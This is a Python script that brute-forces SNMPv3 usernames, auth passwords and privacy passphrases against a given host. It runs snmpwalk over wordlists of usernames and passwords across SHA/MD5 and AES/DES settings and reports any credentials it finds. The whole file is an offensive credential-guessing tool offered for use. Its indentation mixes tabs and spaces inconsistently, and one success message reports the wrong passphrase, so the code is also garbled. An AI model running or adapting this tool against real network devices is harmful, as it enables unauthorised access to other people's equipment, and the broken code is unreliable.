## Copyright (c) 2019 Aniruth V T

import time,argparse,subprocess
from datetime import datetime

startTime = datetime.now()

arg_parser = argparse.ArgumentParser()
arg_parser.add_argument('--hostIP', type=str)
arg_parser.add_argument('--auth', type=str)
args = arg_parser.parse_args()

Test_IP = args.hostIP
a = args.auth

#auth = ['authNoPriv','authPriv'] ##'noAuthNoPriv']
protocol =['SHA','MD5']
priv = ['AES','DES']

with open('passwords.txt') as p:
	passwords = p.readlines()
p.close()

with open('usernames.txt') as u:
	usernames = u.readlines()
u.close()

c = 0
t = 0

try:
	if a == 'authNoPriv':
		for p in protocol:
			for user in usernames:
				user = user.replace("\n","").replace("\r","")
				for password in passwords:
					password = password.replace("\n","")
					if len(password)< 8:
						continue
					c = c+1
					cmd = ['snmpwalk','-v', '3', '-a', p, '-A', password, '-u',user,'-l',a, Test_IP+' iso.1.1']
					proc = subprocess.Popen(cmd,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
					o,output = proc.communicate()
					print(c,user,password)
					if 'Unknown user name' in output:
						print("Invaid UserName")
						break
					if 'Timeout' in output:
						t = t + 1
					else:
						t = 0
					if t>5:
						print("Unable to connect to host - Timeout error")
						print("Execution Finished in "+ str(datetime.now() - startTime))
                        exit()
					if 'Authentication failure' not in output:
						if 'iso.3' in o:
							print("Credentials Obtained!! \nUsername = "+user+" Password = "+password)
				            print("Number of Tries : " +str(c))
				            print("Execution Finished in "+ str(datetime.now() - startTime))
							exit()

	if a == 'authPriv':
		for privilege in priv:
			for p in protocol:
				for user in usernames:
					user = user.replace("\n","").replace("\r","")
					if len(user)< 5:
						continue
					for password in passwords:
		            	password = password.replace("\n","")
						if len(password)< 8:
							continue
						c = c+1
			            cmd = ['snmpwalk','-v', '3', '-a', p, '-A', password, '-u',user,'-l',a,'-x',privilege,'-X',password, Test_IP+' iso.1.1']
						proc = subprocess.Popen(cmd,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
						o,output = proc.communicate()
						print(c, user, password, password)
						if 'Unknown user name' in output:
							print("Invaid UserName")
							break
						if 'Authentication failure' not in output:
							if 'iso.3' in o:
								print("Credentials Obtained!! \nUsername = "+user+" Password = "+password+"Passphrase = "+password)
								print("Number of Tries : " +str(c))
								print("Execution Finished in "+ str(datetime.now() - startTime))
								exit()
                        	for password1 in passwords:
								password1 = password1.replace("\n","")
								if len(password1)< 8:
									continue
								c = c+1
			                    cmd = ['snmpwalk','-v', '3', '-a', p, '-A', password, '-u',user,'-l',a,'-x',privilege,'-X',password1, Test_IP+' iso.1.1']
								proc = subprocess.Popen(cmd,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
								o,output = proc.communicate()
                            	print(c, user, password, password1)
								if 'Timeout' in output:
									t = t+1
								else:
				                	t = 0
								if t>5:
				                	print("Unable to connect to host - Timeout error")
									print("Number of Tries : " +str(c))
                                	print("Execution Finished in "+ str(datetime.now() - startTime))
				                    exit()
								if 'Authentication failure' not in output:
				                	if 'iso.3' in o:
										print("Credentials Obtained!! \nUsername = "+user+" Password = "+password+"Passphrase = "+password)
				                        print("Number of Tries : " +str(c))
                                      	print("Execution Finished in "+ str(datetime.now() - startTime))
				                        exit()
	if a != 'authPriv' and a != 'authNoPriv':
		print("Invalid Auth!\n1. authNoPriv\n2. authPriv")
		print("Example: python Snmp_kali.py --hostIP x.x.x.x --auth authNoPriv")

except Exception as e:
	print("Exception - "+str(e))
	print("Example: python Snmp_kali.py --hostIP x.x.x.x --auth authNoPriv")
	print("Number of Tries : " +str(c))
	print("Execution Finished in "+ str(datetime.now() - startTime))
